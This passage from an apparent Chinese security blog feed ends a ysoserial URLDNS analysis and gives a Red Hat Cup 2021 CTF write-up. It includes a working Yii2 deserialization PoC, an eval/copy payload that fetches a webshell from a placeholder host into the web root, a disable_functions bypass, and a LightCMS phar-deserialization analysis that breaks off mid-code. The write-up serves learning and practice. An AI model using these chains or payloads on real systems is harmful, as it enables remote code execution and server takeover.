class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">URL</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">transient</span> URLStreamHandler handler;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;</span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过这一行代码，才会调用到漏洞点</span></span><br><span class="line">        hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以得知，URL类的 hashCode属性 并无 <code>transient</code> 修饰，且若 <code>hashCode()</code> 中 URL类 的 <code>hashCode</code> 值不为 -1 将会直接 <code>return</code>，无法执行到跳板 <code>handler.hashCode(this)</code></p><p>而在Poc的代码中，执行了这样的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler);</span><br><span class="line">ht.put(u, url); <span class="comment">//key为URL类的u</span></span><br></pre></td></tr></table></figure><p>跟进 <code>put()</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap</span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//对key调用了hash()方法</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">------</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">//调用了key的hashCode()方法</span></span><br><span class="line"><span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进后可发现，在生成Payload这一步时就会调用URL的 <code>hashCode()</code>，使得这个key值的hashCode属性不为-1。这样的数据被序列化后再反序列化回去时，由于URL hashCode属性不为-1，将无法执行到跳板 <code>handler.hashCode(this)</code></p><p>所以我们需要在 POC中 执行完 <code>Hashmap.put()</code> 后，手动将 hashCode值 还原成-1（用反射是因为hashCode是private修饰的），确保Payload被反序列化后能够正常执行到跳板。</p><br><h2 id="关键点3-自定义了一个继承URLStreamHandler的类"><a href="#关键点3-自定义了一个继承URLStreamHandler的类" class="headerlink" title="关键点3 - 自定义了一个继承URLStreamHandler的类"></a>关键点3 - 自定义了一个继承URLStreamHandler的类</h2><p>跟过链子就知道，最终是 <code>URLStreamHandler</code>类触发的Dns请求。而POC中使用了多态的方式来 new 一个 URLStreamHandler类。为何如此？</p><p>根据注释可知，POC作者不希望在生成POC的时候会执行Dns请求。再根据上文关键点2可知，生成Poc的时候会调用 <code>URL.hashCode()</code>，第一次生成Payload时 <code>URLStreamHandler</code>的 hashCode肯定是-1，铁定会执行到最后的Dns请求代码。</p><p>为了解决这个问题。POC作者使用了多态的方式，自定义继承 <code>URLStreamHandler</code> 的类 <code>SilentURLStreamHandler</code>，并重写其关键方法 <code>getHostAddress()</code>，这样在运行Poc时只会调用到 <code>SilentURLStreamHandler</code>的<code>getHostAddress()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//new 谁就用谁的方法</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler);</span><br><span class="line">    ht.put(u, url);</span><br><span class="line">.....</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//啥也没干的 getHostAddress()</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>【代码审计】知识星球 - Java安全漫谈</p><p><a href="https://xz.aliyun.com/t/9417#toc-2">https://xz.aliyun.com/t/9417#toc-2</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;大概学了一个多月Java，感觉有点底子了以后，终于开始学习Java相关漏洞了。搓搓手 ==&lt;/p&gt;
&lt;p&gt;开个ysoserial的新坑。。日后慢慢填 = =&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/categories/java/ysoserial/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="URLDNS" scheme="http://example.com/tags/URLDNS/"/>
    
    <category term="ysoserial" scheme="http://example.com/tags/ysoserial/"/>
    
  </entry>
  
  <entry>
    <title>CTF玩耍系列[3] - [红帽杯2021] WEB2 &amp;&amp; WEB4</title>
    <link href="http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/"/>
    <id>http://example.com/2021/05/10/2021-05-10-HongMaoBei2021-log/</id>
    <published>2021-05-10T14:49:01.000Z</published>
    <updated>2021-05-10T15:47:31.457Z</updated>
    
    <content type="html"><![CDATA[<p>昨天被我亲爱的小杰杰和师弟拉去玩耍了一波红帽杯。。来写下wp做个小记录。</p><p>这次还是只解出来一题WEB2，，老废物了。。。。</p><p>最近没咋更博客。。因为文章都发到安全客上混点零花钱用了。。。= =</p><span id="more"></span><br><h1 id="WEB2-Yii2反序列化"><a href="#WEB2-Yii2反序列化" class="headerlink" title="WEB2 - Yii2反序列化"></a>WEB2 - Yii2反序列化</h1><p>这道题主要考察两个东西吧：Yii2反序列的链子 及 Apache mod_cgi bypass disable_functions</p><br><p>首先找入口点，比赛平台给的控制器为  <code>/controllers/SiteController.php</code> 。</p><p>找到反序列化的入口点 <code>actionAbout()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">actionAbout</span>(<span class="params"><span class="variable">$message</span> = <span class="string">&#x27;Hello&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = base64_decode(<span class="variable">$message</span>);</span><br><span class="line">    unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不清楚路由的，看到页面上的 <strong>“About” 按钮</strong>，点过去就是了。</p><br><p>反序列化POC，这里就不细细分析了，详情可以看看下面这些文章：</p><p><a href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p><p><a href="https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg">https://mp.weixin.qq.com/s/KCGGMBxmW5LSIey5nN7BDg</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//执行的函数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="comment">//函数参数</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;999&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过该POC，得到 disable_functions ，这里注意下，由于有 disable_functions。所以在 poc上无脑冲命令执行的将会得到报错回显。。。这可不是反序列化链子错了。。而是函数被禁用了。。</p><br><p><strong>disable_functions内容：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,<span class="keyword">unset</span>,unlink,<span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>经过了多次测试后，得到这玩意有两个坑：</p><ol><li>使用 <code>assert(eval())</code> 形式执行命令时，注意 eval 里的语句最后要手动加个 <code>die()</code>，不然会使得程序继续执行而报错</li><li>直接写shell，该程序会自动将文件内 $ 后面的字符全部删去，导致无法直接写shell，但可以通过 php 的 copy 函数从 vps 上把shell扒拉下来</li></ol><br><p><strong>修改POC：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="comment">//这里的Web目录可以根据前面的 phpinfo 得知</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;eval(\&#x27;var_dump(copy(&quot;https://xxx.com/11.txt&quot;,&quot;/var/www/html/web/122.php&quot;));die();\&#x27;);&#x27;</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><br><p>上shell后，在 / 目录下发现 readflag 文件。查看权限发现是 003 是 wx 权限，没r权限。说明我们需要执行这个文件才能获取 flag。  </p><br><p>由于 putenv 被禁用了我们不可能使用 LD_PRELOAD 来 Bypass disable_function 。通过查看 apache配置文件可知，.htaccess 开着，并且mod_cgi 也开着。想到也许能通过 .htaccess来指定加载另外一个 php.ini。本以为是史无前例的发现，百度了才发现原来是人尽皆知的东西。。。。==</p><br><p><strong>httpd.conf</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LoadModule cgi_module modules/mod_cgi.so</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">&lt;<span class="built_in">Directory</span> <span class="string">&quot;/var/www/html/web/&quot;</span>&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    <span class="comment"># Allow open access:</span></span><br><span class="line">    <span class="keyword">Require</span> all granted</span><br><span class="line">&lt;/<span class="built_in">Directory</span>&gt;</span><br></pre></td></tr></table></figure><br><p>我们可以使用  Apache Mod CGI 来 bypass，图省事直接用蚁剑插件。。这里挖个坑，过段时间没事干了去研究下 bypass disable_functions 的原理。。翻找文章的时候发现了 <a href="https://blog.csdn.net/rfrder/article/details/109078117">一篇文</a> 感觉写的还可以。</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1.png" width="600px"><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/2.png" width="600px"><br><h1 id="WEB4-LightCMS-0day"><a href="#WEB4-LightCMS-0day" class="headerlink" title="WEB4 - LightCMS 0day"></a>WEB4 - LightCMS 0day</h1><p><a href="https://igml.top/2021/05/10/lightcms-RCE/#more">参考原文</a></p><p>LightCMS 是基于 Laravel 框架的一个CMS。目前的最新版 v1.3.7 基于 Laravel 6.x 开发，PHP&gt;=7.2。</p><p><strong>挖掘思路：</strong></p><ol><li>搜索得到 LightCMS 的历史漏洞 <a href="https://github.com/eddy8/LightCMS/issues/19">RCE in “catchImage”</a>‘  (CVE-2021-27112)</li><li>得知LightCMS可以上传远程文件</li><li><strong>若</strong> 解析远程文件时存在文件函数，PHP&lt;8 可触发 phar 反序列化</li><li>在 phpggc 中有 Laravel 6.x 的链子</li></ol><p>按着这个思路，我们重点调试上传远程文件时的代码即可。（这些都是后面看了wp才得出的结论==，当时根本没有想到 Phar反序列化和 文件上传结合起来。。。果然还是太菜了）</p><h2 id="补充点-Laravel-的知识"><a href="#补充点-Laravel-的知识" class="headerlink" title="补充点 Laravel 的知识"></a>补充点 Laravel 的知识</h2><p>由于之前没怎么摸过 Laravel，这里提一点 Laravel的基本知识，有助于理解这个漏洞</p><h3 id="路由、控制器"><a href="#路由、控制器" class="headerlink" title="路由、控制器"></a>路由、控制器</h3><p>路由文件位置： <strong>/routes</strong></p><p>控制器文件位置：**/app/Http/Controllers**</p><p>/app/Http 目录结构：</p><img src="/2021/05/10/2021-05-10-HongMaoBei2021-log/1-1.png" width="300px"><p><strong>路由</strong></p><p>路由文件会被 <code>App\Providers\RouteServiceProvider</code> 自动加载。可以在该文件中添加路由文件。格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">map</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//api 和 web 是默认就有的</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapApiRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapWebRoutes();</span><br><span class="line">    <span class="comment">//admin 和 member 是 LightCMS 自己加的</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapAdminRoutes();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;mapMemberRoutes();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需要写对应路由文件的路由</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">mapAdminRoutes</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Route::prefix(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">        -&gt;middleware(<span class="string">&#x27;web&#x27;</span>)</span><br><span class="line">        <span class="comment">//路由文件对应的模块位置</span></span><br><span class="line">        -&gt;namespace(<span class="keyword">$this</span>-&gt;namespace . <span class="string">&#x27;\Admin&#x27;</span>)</span><br><span class="line">        <span class="comment">//路由文件位置</span></span><br><span class="line">        -&gt;group(base_path(<span class="string">&#x27;routes/admin.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>知道了有哪些路由文件被加载后，我们直接看对应的路由文件 (<code>routes/admin.php</code>)，格式如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Route::group(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;admin::&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        .....   </span><br><span class="line">        Route::middleware(<span class="string">&#x27;log:admin&#x27;</span>, <span class="string">&#x27;auth:admin&#x27;</span>, <span class="string">&#x27;authorization:admin&#x27;</span>)-&gt;group(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//1. POST请求才会执行该路由</span></span><br><span class="line">            <span class="comment">//2. 路由 url 格式为 /neditor/serve/。&#123;type&#125; 表示参数</span></span><br><span class="line">            <span class="comment">//3. NEditorController@serve 对应 /app/Http/Controllers/Admin/NEditorController.php 的  serve() 方法</span></span><br><span class="line">            Route::post(<span class="string">&#x27;/neditor/serve/&#123;type&#125;&#x27;</span>, <span class="string">&#x27;NEditorController@serve&#x27;</span>)-&gt;name(<span class="string">&#x27;neditor.serve&#x27;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>综上可知发送 POST格式的 <code>admin/neditor/serve/xxx</code> 会被路由到 <code>/app/Http/Controllers/Admin/NEditorController.php</code> 的<code>serve()</code>方法。这个php文件就是开发者自己写的处理业务逻辑的文件了</p><p>查看 <code>serve()</code>方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这里的 $type 对应路由中定义的参数 &#123;type&#125;</span></span><br><span class="line"><span class="comment">//即发送请求 admin/neditor/serve/xxx 时，$type值为 xxx</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serve</span>(<span class="params">Request <span class="variable">$request</span>, <span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!method_exists(<span class="built_in">self</span>::class, <span class="variable">$type</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;未知操作&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//根据传入$type调用本类同名方法</span></span><br><span class="line">    <span class="keyword">return</span> call_user_func(<span class="built_in">self</span>::class . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$type</span>, <span class="variable">$request</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞逻辑"><a href="#漏洞逻辑" class="headerlink" title="漏洞逻辑"></a>漏洞逻辑</h2><p>根据 CVE-2021-27112 的漏洞点，定位到 <code>NEditorController.php</code> 的 <code>catchImage()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">catchImage</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = array_unique((<span class="keyword">array</span>) <span class="variable">$request</span>-&gt;post(<span class="string">&#x27;file&#x27;</span>));</span><br><span class="line">    <span class="variable">$urls</span> = [];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//解析$_POST[&#x27;file&#x27;]，进行远程文件拉取</span></span><br><span class="line">        <span class="comment">//!! 重点跟进该方法 !!</span></span><br><span class="line">        <span class="variable">$image</span> = <span class="keyword">$this</span>-&gt;fetchImageFile(<span class="variable">$v</span>);</span><br><span class="line">        <span class="comment">//!! 重点跟进该方法 !!</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//CVE-2021-27112补丁，校验远程文件合法性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$image</span> || !<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>] || !<span class="keyword">$this</span>-&gt;isAllowedImageType(<span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$path</span> = date(<span class="string">&#x27;Ym&#x27;</span>) . <span class="string">&#x27;/&#x27;</span> . md5(<span class="variable">$v</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$image</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">        <span class="comment">//保存文件</span></span><br><span class="line">        Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))</span><br><span class="line">            -&gt;put(<span class="variable">$path</span>, <span class="variable">$image</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//返回保存文件路径</span></span><br><span class="line">        <span class="variable">$urls</span>[] = [</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span> =&gt; Storage::disk(config(<span class="string">&#x27;light.neditor.disk&#x27;</span>))-&gt;url(<span class="variable">$path</span>),</span><br><span class="line">            <span class="string">&#x27;source&#x27;</span> =&gt; <span class="variable">$v</span>,</span><br><span class="line">            <span class="string">&#x27;state&#x27;</span> =&gt; <span class="string">&#x27;SUCCESS&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">&#x27;list&#x27;</span> =&gt; <span class="variable">$urls</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 <code>fetchImageFile()</code> 方法。该方法可简化成如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchImageFile</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//拉取远程文件</span></span><br><span class="line">    <span class="variable">$ch</span> = curl_init();</span><br><span class="line">    <span class="variable">$options</span> =  [</span><br><span class="line">        CURLOPT_URL =&gt; <span class="variable">$url</span>,</span><br><span class="line">        CURLOPT_RETURNTRANSFER =&gt; <span class="literal">true</span>,</span><br><span class="line">        CURLOPT_USERAGENT =&gt; <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.2 (KHTML, like Gecko) Chrome/22.0.1216.0 Safari/537.2&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    curl_setopt_array(<span class="variable">$ch</span>, <span class="variable">$options</span>);</span><br><span class="line">    <span class="comment">//$data为远程文件内容</span></span><br><span class="line">    <span class="variable">$data</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span 